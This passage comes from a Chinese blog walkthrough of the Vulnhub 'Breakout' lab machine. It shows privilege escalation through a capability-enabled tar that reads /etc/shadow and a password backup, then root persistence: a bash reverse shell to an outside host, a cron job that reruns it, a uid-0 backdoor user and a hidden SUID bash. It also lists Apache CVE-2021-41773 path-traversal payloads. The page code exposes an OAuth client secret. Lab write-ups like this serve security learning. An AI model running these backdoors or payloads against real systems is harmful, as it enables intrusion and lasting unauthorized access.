+                     data-src="https://cdn.nlark.com/yuque/0/2023/png/25772371/1681305674235-eef3ec52-8471-4846-8e3d-b7a558f58fdf.png#averageHue=%239cb0c7&clientId=u49490fc9-f21d-4&from=paste&height=745&id=u17c75162&originHeight=745&originWidth=978&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67557&status=done&style=none&taskId=u606b29ff-308f-4834-b458-28f0639cc96&title=&width=978"
+                      alt="image.png"
+                ><br>现在根据能进入后台了，根据webmin的漏洞开始下一阶段。</p>
+<hr>
+<h3 id="进一步渗透"><a href="#进一步渗透" class="headerlink" title="进一步渗透"></a>进一步渗透</h3><h4 id="权限提升之root找密码"><a href="#权限提升之root找密码" class="headerlink" title="权限提升之root找密码"></a>权限提升之root找密码</h4><p>6、已经登录cyber用户的后台，根据 CVE-2019-15107 Webmin pre-auth RCE 和 CVE-2020-35606 来进行利用测试。<br>一番测试，CVE-2019-15107利用失败。CVE-2020-35606也利用失败。</p>
+<p>这里我陷入了误区，重新整理思路，观察页面，发现一个shell入口。然后：<br><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.nlark.com/yuque/0/2023/png/25772371/1681308028553-1ff6487c-447a-4033-86b0-a065ef4cf748.png#averageHue=%23abacac&clientId=u49490fc9-f21d-4&from=paste&height=92&id=ud5299f4f&originHeight=92&originWidth=362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16696&status=done&style=none&taskId=u5f35f763-5595-48eb-98d0-0bf42157eca&title=&width=362"
+                      alt="image.png"
+                ><br><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.nlark.com/yuque/0/2023/png/25772371/1681308115949-f66c7d4d-f5e5-4f4b-8286-9a592dbf51bf.png#averageHue=%2319212a&clientId=u49490fc9-f21d-4&from=paste&height=554&id=ub77dda93&originHeight=554&originWidth=727&originalType=binary&ratio=1&rotation=0&showTitle=false&size=94945&status=done&style=none&taskId=u0c799066-9d67-4f94-9503-e45265a1d0f&title=&width=727"
+                      alt="image.png"
+                ><br>可以看见任何用户都可执行该tar程序，为什么一个 tar 程序会堂而皇之地出现在用户目录里，并且权限为755。getcap查看一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[cyber@breakout ~]$ <span class="built_in">getcap</span> tar</span><br><span class="line">tar cap_dac_read_search=ep</span><br></pre></td></tr></table></figure>
+<p>cap_dac_read_search表示忽略文件读及目录搜索的DAC访问限制，意味着可以读取任意文件。<br>借鉴他人的智慧，寻找敏感文件，这里就找到了<code>/var/backups/.old_pass.bak</code><br>怎么利用呢？借鉴他人的智慧，先用tar压缩，再解压，就可以读取原本不能读取的文件了！！！MD，好好记着。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[cyber@breakout ~]$ ./tar -cvf pass.tar /var/backups/.old_pass.bak</span><br><span class="line">./tar: Removing leading `/<span class="string">&#x27; from member names</span></span><br><span class="line"><span class="string">/var/backups/.old_pass.bak</span></span><br><span class="line"><span class="string">[cyber@breakout ~]$ ./tar -cvf shadd.tar /etc/shadow</span></span><br><span class="line"><span class="string">./tar: Removing leading `/&#x27;</span> from member names</span><br><span class="line">/etc/shadow</span><br><span class="line">[cyber@breakout ~]$ <span class="built_in">ls</span></span><br><span class="line">pass.tar</span><br><span class="line">shadd.tar</span><br><span class="line">tar</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
+<p>好，现在来解压pass.tar并查看密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[cyber@breakout ~]$ tar -xvf pass.tar</span><br><span class="line">var/backups/.old_pass.bak</span><br><span class="line">[cyber@breakout ~]$ <span class="built_in">ls</span></span><br><span class="line">pass.tar</span><br><span class="line">shadd.tar</span><br><span class="line">tar</span><br><span class="line">user.txt</span><br><span class="line">var</span><br><span class="line">[cyber@breakout ~]$ <span class="built_in">cd</span> var/backups/</span><br><span class="line">[cyber@breakout backups]$ <span class="built_in">ls</span> -a</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.old_pass.bak</span><br><span class="line">[cyber@breakout backups]$ <span class="built_in">cat</span> .old_pass.bak</span><br><span class="line">Ts&amp;4&amp;YurgtRX(=~h</span><br></pre></td></tr></table></figure>
+<p>获得一个字符串：<code>Ts&amp;4&amp;YurgtRX(=~h</code>，可以猜测这是某个用户的密码。</p>
+<p>7、根据enum4linux扫描出的用户名，就猜它是 root 用户密码。进入 10000端口登录试试。登录成功！<br><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.nlark.com/yuque/0/2023/png/25772371/1681312061921-fbce9d7f-719a-4448-985a-7e874ee179be.png#averageHue=%2383a0c2&clientId=u49490fc9-f21d-4&from=paste&height=1007&id=u43d3e918&originHeight=1007&originWidth=1130&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90425&status=done&style=none&taskId=ue9ae1f6a-37a9-433b-8cc1-1e766e1d9d1&title=&width=1130"
+                      alt="image.png"
+                ><br>使用root用户的shell，来留个后门。找到第二个flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@breakout ~]<span class="comment"># ls</span></span><br><span class="line">rOOt.txt</span><br><span class="line">[root@breakout ~]<span class="comment"># cat rOOt.txt</span></span><br><span class="line">3mp!r3&#123;You_Manage_To_BreakOut_From_My_System_Congratulation&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><ul>
+<li><p>尝试建立反弹连接，成功，使用&#x2F;bin&#x2F;bash、bash、&#x2F;bin&#x2F;sh、sh 都发生了sh: 1: Syntax error: Bad fd number的错误。于是将代码写入sh文件。然后用 bash 去执行；使用 bash -c 也可以。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rev.sh</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.59.128/9001 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute</span></span><br><span class="line">bash rev.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># bash -c</span></span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.59.128/9001 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>尝试访问我kali搭建的web服务，下载 frp 客户端。<br>成功下载，成功连接，但是靶机没有SSH服务，所以真实环境下，我可以给目标安装一个SSH服务吗，或者说更改配置，使用目标机器有的服务。</p>
+</li>
+<li><p>frp 使用客户端web服务配置：</p>
+<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[web2]</span><br><span class="line"><span class="keyword">type</span> = http</span><br><span class="line">local_port = <span class="number">10000</span></span><br><span class="line">remote_port = <span class="number">8081</span></span><br><span class="line">custom_domains = www.webmin555.com</span><br></pre></td></tr></table></figure>
+<p>这样就可以用其他主机通过kali的8081端口来登录靶机的10000端口。</p>
+</li>
+<li><p>尝试增加一个SUID为0的用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd hackb -p hack</span><br><span class="line"><span class="comment"># 修改/etc/passwd，将hackb的uid改为0</span></span><br><span class="line">hackb:x:0:1003::/home/hackb:/bin/sh</span><br></pre></td></tr></table></figure>
+<p>这里限制了其他用户的登录。没能登录创建的账号。</p>
+</li>
+<li><p>留一个s权限的命令</p>
+<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># root 权限</span><br><span class="line">cp /bin/bash /<span class="keyword">var</span>/.bsh</span><br><span class="line">chmod <span class="number">4775</span> /<span class="keyword">var</span>/.bsh</span><br><span class="line"></span><br><span class="line">ls -l /<span class="keyword">var</span>/.bsh</span><br><span class="line">-rwsrwxr-x <span class="number">1</span> root root <span class="number">1234376</span> Apr <span class="number">12</span> <span class="number">21</span>:<span class="number">04</span> /<span class="keyword">var</span>/.bsh</span><br><span class="line"></span><br><span class="line"># cyber用户</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+</li>
+<li><p>尝试添加一个定时任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@breakout crontabs]<span class="comment"># crontab -e</span></span><br><span class="line">Error opening terminal: unknown.</span><br><span class="line">crontab: <span class="string">&quot;/usr/bin/sensible-editor&quot;</span> exited with status 1</span><br><span class="line"></span><br><span class="line">[root@breakout crontabs]<span class="comment"># vim /etc/crontab </span></span><br><span class="line">* * * * * 	root	bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.59.128/9001 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<p>下面搜集了一些靶机上服务的一些漏洞信息，但是这些漏洞都没能在靶机上用出来。</p>
+<h3 id="搜集漏洞信息"><a href="#搜集漏洞信息" class="headerlink" title="搜集漏洞信息"></a>搜集漏洞信息</h3><p>现在，我们知道有http服务80端口，中间件为Apache2.4.51，所以可以查一查这个版本Apache2的漏洞。<br>其次，对于Webmin，一方面可以尝试弱口令爆破，另一方面根据两个版本的Webmin，去搜索相关的漏洞。<br>最后，对于139和445端口，同样根据其版本搜索相关漏洞。</p>
+<p>我优先找了Webmin的漏洞。一个是CVE-2019-15107，未授权RCE，影响版本为：Webmin  &lt;&#x3D; 1.920 。还有一个是CVE-2020-35606，影响版本为Webmin &lt;&#x3D; 1.962.</p>
+<hr>
+<h4 id="CVE-2019-15107-Webmin-pre-auth-RCE"><a href="#CVE-2019-15107-Webmin-pre-auth-RCE" class="headerlink" title="CVE-2019-15107 Webmin pre-auth RCE"></a>CVE-2019-15107 Webmin pre-auth RCE</h4><p>在其<strong>找回密码页面</strong>中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。<br>这个漏洞只存在于官方的sourceforge上，而Github上没有这个漏洞，可能是一次供应链攻击。</p>
+<h4 id="CVE-2020-35606"><a href="#CVE-2020-35606" class="headerlink" title="CVE-2020-35606"></a>CVE-2020-35606</h4><p>任何被授权使用Package Updates模块的用户都可以使用根权限通过包含和的向量执行任意命令。</p>
+<hr>
+<p>关于 Apache2 2.4.51，找到一个任意文件读取漏洞。影响范围是 2.4.49-51，漏洞编号：CVE-2021-41773。</p>
+<h4 id="CVE-2021-41773-任意文件读取"><a href="#CVE-2021-41773-任意文件读取" class="headerlink" title="CVE-2021-41773 任意文件读取"></a>CVE-2021-41773 任意文件读取</h4><p>攻击者可利用该漏洞读取到Web目录外的其他文件。如：系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意<strong>请求执行命令，控制服务器</strong>。</p>
+<p><strong>漏洞利用前提条件</strong>：<br>1、Web容器 Apache版本为&gt;&#x3D; 2.4.49<br>2、服务器中设置所有目录允许被访问  例如 Apachep配置文件配置。<br><strong>Payload：</strong></p>
+<figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">49</span></span><br><span class="line">/cgi-bin/.%<span class="number">2</span>e/%<span class="number">2</span>e%<span class="number">2</span>e/%<span class="number">2</span>e%<span class="number">2</span>e/%<span class="number">2</span>e%<span class="number">2</span>e/etc/passwd</span><br><span class="line"></span><br><span class="line"># <span class="number">50</span></span><br><span class="line">/cgi-bin/%<span class="number">2</span>e%%<span class="number">32</span>%<span class="number">65</span>/%<span class="number">2</span>e%%<span class="number">32</span>%<span class="number">65</span>/%<span class="number">2</span>e%%<span class="number">32</span>%<span class="number">65</span>/%<span class="number">2</span>e%%<span class="number">32</span>%<span class="number">65</span>/%<span class="number">2</span>e%%<span class="number">32</span>%<span class="number">65</span>/etc/passwd</span><br><span class="line"></span><br><span class="line"># <span class="number">51</span></span><br><span class="line">/cgi-bin/%<span class="number">2</span>e%%<span class="number">32</span>%<span class="number">65</span>/%<span class="number">2</span>e%%<span class="number">32</span>%<span class="number">65</span>/%<span class="number">2</span>e%%<span class="number">32</span>%<span class="number">65</span>/%<span class="number">2</span>e%%<span class="number">32</span>%<span class="number">65</span>/%<span class="number">2</span>e%%<span class="number">32</span>%<span class="number">65</span>/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2017-7494-Samba-RCE—SambaCry漏洞"><a href="#CVE-2017-7494-Samba-RCE—SambaCry漏洞" class="headerlink" title="CVE-2017-7494 Samba RCE—SambaCry漏洞"></a>CVE-2017-7494 Samba RCE—SambaCry漏洞</h4><blockquote>
+<p>Samba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4 that is vulnerable to a remote code execution vulnerability named <strong>SambaCry</strong>.</p>
+</blockquote>
+<p>该漏洞允许远程授权用户上传一个共享库到共享文件夹中执行命令，从而获取服务器的控制权。</p>
+<p>MSRPC协议允许远程连接一个命名管道，当通过Samba尝试连接管道时，服务器会使用内部函数<code>is_known_pipename()</code>来检验管道名字的合法性。<br>一个外部RPC服务器被设置在smb.conf中使用 rpc_server 变量，它就会来处理pipe请求。<br>此时，<code>is_known_pipename()</code>不会检验pipe是否有效，它允许使用 <code>&#39;/&#39;</code>插入任意库的全路径（绝对）。</p>
+<p>利用工具：<br>利用条件：</p>
+<ul>
+<li>匿名可写服务器或者经过身份验证的 Samba账户</li>
+<li>可写共享目录的已知路径</li>
+</ul>
+<p>	</p>
+<hr>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    
+<div class="article-copyright-info-container">
+    <ul class="copyright-info-content">
+        <li class="post-title">
+            <span class="type">本文标题</span>：<span class="content">Vulnhub 02 Breakout</span>
+        </li>
+        <li class="post-author">
+            <span class="type">本文作者</span>：<span class="content">seconme</span>
+        </li>
+        <li class="post-time">
+            <span class="type">创建时间</span>：<span class="content">2023-05-03 13:00:56</span>
+        </li>
+        <li class="post-link">
+            <span class="type">本文链接</span>：<span class="content">2023/05/03/Vulnhub 02 Breakout/</span>
+        </li>
+        <li class="post-license">
+            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
+        </li>
+    </ul>
+    <div class="copy-copyright-info flex-center tooltip" data-content="复制版权信息" data-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/">#靶场实战</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/05/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Java反序列化</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/05/02/hello-world/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Hello World</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;评论
+    </div>
+    
+        
+            
+
+    <div class="gitalk-comment-container">
+        <div id="gitalk-container"></div>
+        <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+        <script  src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+        <script >
+          function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+              __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+              Gitalk && new Gitalk({
+                clientID: '17efb64209824b16935b',
+                clientSecret: '2ceab4677a6e6b5ebd72a6d3207a6611b13b7e95',
+                repo: 'hexo-blog-comments',
+                owner: 'seconme',
+                admin: 'seconme',
+                id: __gitalk__pathname,
+                proxy: '',
+                language: 'zh-CN'
+              }).render('gitalk-container');
+            } catch (e) {
+              window.Gitalk = null;
+            }
+          }
+
+          if ('false' === 'true') {
+            const loadGitalkTimeout = setTimeout(() => {
+              loadGitalk();
+              clearTimeout(loadGitalkTimeout);
+            }, 1000);
+          } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#02-Breakout"><span class="nav-number">1.</span> <span class="nav-text">02 Breakout</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">1.1.</span> <span class="nav-text">准备工作</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Webmin-miniServ"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. Webmin miniServ</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SMB%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7%EF%BC%9Aenum4linux"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. SMB枚举工具：enum4linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%BC%80%E5%A7%8B"><span class="nav-number">1.2.</span> <span class="nav-text">实战开始</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E6%AD%A5%E6%89%AB%E6%8F%8F"><span class="nav-number">1.2.1.</span> <span class="nav-text">初步扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.2.</span> <span class="nav-text">进一步渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B9%8Broot%E6%89%BE%E5%AF%86%E7%A0%81"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">权限提升之root找密码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">权限维持</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%9C%E9%9B%86%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.3.</span> <span class="nav-text">搜集漏洞信息</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2019-15107-Webmin-pre-auth-RCE"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">CVE-2019-15107 Webmin pre-auth RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2020-35606"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">CVE-2020-35606</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2021-41773-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">CVE-2021-41773 任意文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE-2017-7494-Samba-RCE%E2%80%94SambaCry%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.3.4.</span> <span class="nav-text">CVE-2017-7494 Samba RCE—SambaCry漏洞</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2023</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">seconme</a>
+            
+        </div>
+        
+            <script async 
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
+            <div class="deploy-info info-item">
+                
+                    本站由 <span class="tooltip" data-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span> 提供部署服务
+                
+            </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts">
+    
+        <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+
+</body>
+</html>
